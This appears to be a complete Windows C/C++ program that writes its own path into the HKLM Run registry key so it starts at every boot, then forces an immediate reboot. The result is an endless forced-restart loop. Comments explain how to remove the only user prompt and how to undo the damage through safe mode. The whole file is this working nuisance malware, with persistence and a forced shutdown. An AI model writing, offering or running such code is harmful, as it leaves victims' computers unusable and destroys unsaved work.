#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

/**
* how to fix it, go to security mode
* delete file or regedit
*/

BOOL MySystemShutdown(){
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    // Get a token for this process. 
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return( FALSE );

    // Get the LUID for the shutdown privilege.
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);

    tkp.PrivilegeCount = 1;  // one privilege to set    
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Get the shutdown privilege for this process.
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    if (GetLastError() != ERROR_SUCCESS)
        return FALSE;
    // Shut down the system and force all applications to close.
    // options : EWX_SHUTDOWN EWX_REBOOT
    if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED))
        return FALSE;
    return TRUE;
}
void edit_reg(){
    HKEY hKey;
    REGSAM flag = KEY_WOW64_64KEY; 
    LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS | flag, &hKey);
    if ( ERROR_SUCCESS != lRet){
        printf("RegKey open failed.");
        return;
    } 

    TCHAR sz_path_c[MAXBYTE] = {0};
    GetModuleFileName(nullptr, sz_path_c, MAXBYTE);    // get current exe file path
    RegSetValueEx(hKey, TEXT("ShutDown"), 0, REG_SZ, (LPBYTE)sz_path_c, wcslen(sz_path_c)*sizeof(TCHAR)+1);
    if ( ERROR_SUCCESS != lRet){ 
        printf("RegKey write failed.");
        return;  
    }
    RegCloseKey(hKey);
}

int main(int argc, char* argv[]){
    // comment this out will cause no prompt
    system("pause");

    // edit regedit, auto-run when computer start
    edit_reg();
    
    MySystemShutdown();

    return 0;
}